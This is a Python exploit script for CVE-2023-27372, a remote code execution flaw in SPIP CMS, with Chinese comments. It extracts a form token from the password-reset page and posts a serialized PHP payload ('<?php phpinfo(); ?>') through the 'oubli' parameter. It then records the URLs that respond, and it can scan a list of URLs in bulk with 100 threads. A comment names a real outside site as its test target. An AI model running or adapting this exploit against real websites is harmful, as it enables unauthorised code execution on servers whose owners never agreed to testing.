import requests, argparse
from multiprocessing.dummy import Pool
from bs4 import BeautifulSoup
from urllib.parse import quote
# 测试网站http://www.intare.rw
safe_chars = ''.join(chr(c) for c in range(ord('a'), ord('z')+1)) + \
             ''.join(chr(c) for c in range(ord('A'), ord('Z')+1)) + \
             ''.join(chr(c) for c in range(ord('0'), ord('9')+1))
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                                                   ______
    ______________________________________________ ___  /
    ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
    __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
    _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
    /_/                                                  
                                       author:lly
                                       date:2024-09-2
                                       version:1.0                    
    """
    print(test)


def poc(url):
    payload = '/spip.php?page=spip_pass'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
    }
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }
    headers1 = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "If-Modified-Since":"Mon,02Sep202412:12: 11GMT",
    }
    response = requests.get(url=url+payload,headers=headers1,proxies=proxie)
    # print(f'{url}{payload}')
    with open('html.txt','w',encoding='utf-8') as f:
        f.write(response.text)
    with open('html.txt', 'r', encoding='utf-8') as file:
        html_content = file.read()
        soup = BeautifulSoup(html_content, 'html.parser')
        input_tag = soup.find('input', attrs={'name': 'formulaire_action_args'})
        if input_tag:
            value = input_tag['value']
            # print(value)
        else:
            print("未找到具有指定name属性的<input>标签")
    value1 = quote(value, safe=safe_chars)
    data=f'page=spip_pass&formulaire_action=oubli&formulaire_action_args={value1}&oubli=s:19:"<?php phpinfo(); ?>";&nobot='

    # print(data)
    res1 = requests.post(url=url+payload,data=data,headers=headers)
    with open('html1.txt','w',encoding='utf-8') as f1:
        f1.write(res1.text)
    if 'version' in res1.text:
        print(f'[+]{url}存在漏洞')
        with open('result.txt','a',encoding='utf-8') as f1:
            f1.write(f'{url}存在CVE-2023-27372 SPIP CMS远程代码执行漏洞\n')






def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="CVE-2023-27372 SPIP CMS远程代码执行漏洞")

    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")



if __name__ == '__main__':
    main()
